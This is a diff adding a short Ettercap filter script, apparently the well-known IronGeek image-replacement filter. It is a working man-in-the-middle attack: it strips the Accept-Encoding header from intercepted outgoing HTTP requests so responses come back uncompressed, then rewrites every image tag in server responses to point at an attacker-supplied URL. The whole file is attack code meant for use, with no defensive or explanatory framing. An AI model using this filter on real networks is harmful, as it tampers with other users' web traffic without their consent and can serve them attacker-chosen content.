@@ -1,0 +1,20 @@
+# Author: IronGeek based on code from ALoR and NaGA 
+# Along with some help from Kev and jon.dmml ||
+# Description: Replaces images in webpages.
+# Just enter the url of the image that you want to use. ||
+# Type: Single ||
+
+
+if (ip.proto == TCP && tcp.dst == 80) {
+   if (search(DATA.data, "Accept-Encoding")) {
+      replace("Accept-Encoding", "Accept-Rubbish!"); 
+	  msg("zapped Accept-Encoding!\n");
+   }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+   replace("img src=", "img src=\"REPLACE_ME\" ");
+   replace("IMG SRC=", "img src=\"REPLACE_ME\" ");
+   msg("Filter Ran.\n");
+}
+
